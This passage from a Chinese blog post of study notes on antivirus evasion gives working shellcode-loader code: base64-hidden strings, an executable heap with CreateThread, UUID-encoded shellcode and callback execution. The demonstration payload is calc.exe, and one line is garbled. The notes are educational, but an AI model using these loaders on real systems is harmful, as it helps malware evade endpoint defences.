class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, global_string);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果编写的是一些敏感参数的工具，很容易会被提取出特征，例如lcx这款工具，它的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Usage of Packet Transmit:]</span><br><span class="line"></span><br><span class="line">lcx -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line"></span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -tran&lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt;&lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure><p>其中，<code>-listen</code>、<code>-tran</code>、<code>-slave</code>非常敏感，一般常见程序不会高频使用这些参数名，因此落地被杀也是意料之中。</p><h2 id="C-重载运算符"><a href="#C-重载运算符" class="headerlink" title="C++ 重载运算符"></a>C++ 重载运算符</h2><p>C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为函数重载和运算符重载。</p><p>重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadString</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">DWORD dwStrLength = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> szOutStr;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Base64decode</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> szBase64String, LPDWORD lpdwLen)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">BadString(<span class="built_in">std</span>::<span class="built_in">string</span> szInStr);</span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">std::string</span><span class="params">()</span></span>;</span><br><span class="line">~BadString();</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &quot;BadString.h&quot;</span></span><br><span class="line"></span><br><span class="line">std::string BadString::Base64decode(std::string szBase64String, LPDWORD lpdwLen)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwLen;</span><br><span class="line">DWORD dwNeed;</span><br><span class="line">PBYTE lpBuffer = NULL;</span><br><span class="line">dwLen = szBase64String.length();</span><br><span class="line">dwNeed = <span class="number">0</span>;</span><br><span class="line">CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, NULL, &amp;dwNeed, NULL, NULL);</span><br><span class="line"><span class="keyword">if</span> (dwNeed)</span><br><span class="line">&#123;</span><br><span class="line">lpBuffer = <span class="keyword">new</span> BYTE[dwNeed + <span class="number">1</span>];</span><br><span class="line">ZeroMemory(lpBuffer, dwNeed + <span class="number">1</span>);</span><br><span class="line">CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, lpBuffer, &amp;dwNeed, NULL, NULL);</span><br><span class="line">*lpdwLen = dwNeed;</span><br><span class="line">&#125;</span><br><span class="line">return std::string((PCHAR)lpBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::BadString(std::string szInStr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;dwStrLength = szInStr.length();</span><br><span class="line"><span class="keyword">this</span>-&gt;szOutStr = <span class="keyword">this</span>-&gt;Base64decode(szInStr, &amp;<span class="keyword">this</span>-&gt;dwStrLength);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::operator std::string()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;szOutStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::~BadString()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用方式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BadString.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(BadString(<span class="string">&quot;SGVsbG8gV29ybGQK&quot;</span>)) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设一个功能函数的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CCooolisMetasploit::SendPayload</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> options, <span class="built_in">std</span>::<span class="built_in">string</span> payload)</span></span></span><br></pre></td></tr></table></figure><p>那么，调用这个函数时，传递的<code>std::string options</code>这个字符串可能会被定位，这个时候需要在传入之前调用一个函数，进行一次解密，把解密后的字符串传入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metasploit-&gt;add_option(CooolisString(&quot;LXAsLS1wYXlsb2Fk&quot;), msf_payload, CooolisString(&quot;UGF5bG9hZCBOYW1lLCBlLmcuIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3A&#x3D;&quot;))-&gt;default_str(CooolisString(&quot;d2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcA&#x3D;&#x3D;&quot;));</span><br></pre></td></tr></table></figure><h1 id="第九课"><a href="#第九课" class="headerlink" title="第九课"></a>第九课</h1><h2 id="数据执行保护（DEP）"><a href="#数据执行保护（DEP）" class="headerlink" title="数据执行保护（DEP）"></a>数据执行保护（DEP）</h2><p>DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 <strong>微软从Windows XP SP2引入了该技术，并一直延续到今天。</strong></p><hr><p>为什么要有DEP：</p><p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限<strong>制某些内存页不具有可执行权限。</strong></p><h2 id="如何绕过DEP"><a href="#如何绕过DEP" class="headerlink" title="如何绕过DEP"></a>如何绕过DEP</h2><p><code>VirtualProtect</code>这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为<code>VirtualProtect</code>的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从”不可执行”变成”可执行”。</p><h2 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h2><p>Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？</p><p><code>HeapCreate</code>可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">HeapCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in DWORD flOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwMaximumSize )</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数<code>flOptions</code>用于修改如何在堆栈上执行各种操作。 你可以设定<code>0</code>、<code>HEAP_NO_SERIALIZE</code>、<code>HEAP_GENERATE_EXCEPTIONS</code>、<code>HEAP_CREATE_ENABLE_EXECUTE</code>或者是这些标志的组合。</p><ul><li><code>HEAP_NO_SERIALIZE</code>：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。</li><li><code>HEAP_GENERATE_EXCEPTIONS</code>：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。</li><li><code>HEAP_CREATE_ENALBE_EXECUTE</code>：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。</li></ul><p>看到<code>HEAP_CREATE_ENALBE_EXECUTE</code>相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。</p><h2 id="Shellcode-执行"><a href="#Shellcode-执行" class="headerlink" title="Shellcode 执行"></a>Shellcode 执行</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">PVOID Mptr = HeapAlloc(hHep, <span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">RtlCopyMemory(Mptr, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello World!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第十课"><a href="#第十课" class="headerlink" title="第十课"></a>第十课</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 </p><p>Windows中的GUID 等同于 UUID, 其结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GUID</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Data1; <span class="comment">// 4字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data2; <span class="comment">// 2字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data3; <span class="comment">// 2字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  Data4[<span class="number">8</span>]; <span class="comment">// 8字节</span></span><br><span class="line">&#125; GUID;</span><br></pre></td></tr></table></figure><p>总和一共16字节，16*8 = 128位。</p><h2 id="与uuid-相关的Windows-API"><a href="#与uuid-相关的Windows-API" class="headerlink" title="与uuid 相关的Windows API"></a>与uuid 相关的Windows API</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidFromString</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_CSTR StringUuid,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID     *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>功能：将字符串uuid转换为uuid结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>功能：创建UUID结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">UuidEqual</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid1,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid2,</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_STATUS *Status</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>功能：判断两个UUID是否相等。</p><p>UUID 代表了 -&gt; <code>typedef GUID UUID;</code></p><h2 id="uuid-测试"><a href="#uuid-测试" class="headerlink" title="uuid 测试"></a>uuid 测试</h2><p>生成 shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfvenom -p windows&#x2F;exec CMD&#x3D;calc.exe -b &#39;\xfc\xe8&#39; -f raw -o &#x2F;tmp&#x2F;shellcode.bin</span><br></pre></td></tr></table></figure><p>bin2uuid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> UUID</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ____  _    _______    _    _ _    _ _____ _____       </span></span><br><span class="line"><span class="string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span></span><br><span class="line"><span class="string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span></span><br><span class="line"><span class="string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span></span><br><span class="line"><span class="string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span></span><br><span class="line"><span class="string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span></span><br><span class="line"><span class="string">\n&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>] == <span class="string">&quot;--print&quot;</span>:</span><br><span class="line">    outputMapping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    outputMapping = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.format(len(bin)))</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(offset &lt; len(bin)):</span><br><span class="line">    countOfBytesToConvert = len(bin[offset:])</span><br><span class="line">    <span class="keyword">if</span> countOfBytesToConvert &lt; <span class="number">16</span>:</span><br><span class="line">        ZerosToAdd = <span class="number">16</span> - countOfBytesToConvert</span><br><span class="line">        byteString = bin[offset:] + (<span class="string">b&#x27;\x00&#x27;</span>* ZerosToAdd)</span><br><span class="line">        uuid = UUID(bytes_le=byteString)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byteString = bin[offset:offset+<span class="number">16</span>]</span><br><span class="line">        uuid = UUID(bytes_le=byteString)</span><br><span class="line">    offset+=<span class="number">16</span></span><br><span class="line"></span><br><span class="line">    out += <span class="string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.format(uuid)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> outputMapping:</span><br><span class="line">        print(<span class="string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.format(byteString, uuid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(out)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Outputted to: &#123;&#125;&quot;</span>.format(sys.argv[<span class="number">1</span>] + <span class="string">&quot;UUIDs&quot;</span>))</span><br></pre></td></tr></table></figure><p>生成测试样本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * buf[] = &#123;</span><br><span class="line"><span class="string">&quot;4baf01bd-dbdd-d9de-7424-f45a33c9b131&quot;</span>,</span><br><span class="line"><span class="string">&quot;83136a31-04c2-6a03-0e4d-be21f81341da&quot;</span>,</span><br><span class="line"><span class="string">&quot;3fcb73f8-b3c9-34af-7904-bb1975efe989&quot;</span>,</span><br><span class="line"><span class="string">&quot;bd259d0e-28a7-f010-3800-6093ba5bb573&quot;</span>,</span><br><span class="line"><span class="string">&quot;72c89383-cec4-2621-9d85-94d7aad02453&quot;</span>,</span><br><span class="line"><span class="string">&quot;802cf5e0-f4b0-171d-cbae-bd9918dbf781&quot;</span>,</span><br><span class="line"><span class="string">&quot;394ee67d-9cb5-eb50-845d-fed229acfe13&quot;</span>,</span><br><span class="line"><span class="string">&quot;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&quot;</span>,</span><br><span class="line"><span class="string">&quot;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&quot;</span>,</span><br><span class="line"><span class="string">&quot;3327227b-f020-6246-8c57-76746f07d2fe&quot;</span>,</span><br><span class="line"><span class="string">&quot;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&quot;</span>,</span><br><span class="line"><span class="string">&quot;bad08a62-64c7-e79b-61ed-4272307075a8&quot;</span>,</span><br><span class="line"><span class="string">&quot;59f68d76-6a06-2be6-0336-a0c0792745e7&quot;</span>,</span><br><span class="line"><span class="string">&quot;844c482e-dab1-650c-545b-b67900000000&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dwNum = <span class="keyword">sizeof</span>(buf) / <span class="keyword">sizeof</span>(buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">PVOID pMemory = HeapAlloc(hMemory, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">DWORD_PTR CodePtr = (DWORD_PTR)pMemory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; dwNum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (CodePtr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">RPC_STATUSstatus = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);</span><br><span class="line"><span class="keyword">if</span> (status != RPC_S_OK) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">CodePtr += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, <span class="literal">NULL</span>) == FALSE) &#123;</span><br><span class="line"><span class="comment">// 加载成功</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Windows-CALL-BACK-函数"><a href="#Windows-CALL-BACK-函数" class="headerlink" title="Windows CALL BACK 函数"></a>Windows CALL BACK 函数</h2><p>CALL BACK意为回调，是定义一个函数，由系统某个事件或用户的动作自动触发的函数，因此调用者不是用户。</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HINTERNET hOpen;                       <span class="comment">// Root HINTERNET handle</span></span><br><span class="line">INTERNET_STATUS_CALLBACK iscCallback;  <span class="comment">// Holds the callback function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the root HINTERNET handle.</span></span><br><span class="line">hOpen = InternetOpen( TEXT(<span class="string">&quot;Test Application&quot;</span>),</span><br><span class="line">                      INTERNET_OPEN_TYPE_PRECONFIG,</span><br><span class="line">                      <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the status callback function.</span></span><br><span class="line">iscCallback = InternetSetStatusCallback( hOpen, (INTERNET_STATUS_CALLBACK)CallMaster );</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">CallMaster</span><span class="params">( HINTERNET,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD_PTR,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果CallMaster指向的是一块可执行属性的内存，那么就可以加载Shellcode。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果真要走红队免杀这块，Windows 核心编程、Windows 操作系统相关的东西那必须非常熟练才行。</p><p>路漫漫……不要急于求成……</p><p>代码都没有本地测试，只是先了解了一下常见的方法。明天或者有空了在虚拟机里面用vs测试。mac版的vs没法编译c/c++。clion 也没有，没有 windows.h 这个头文件。</p><p><img 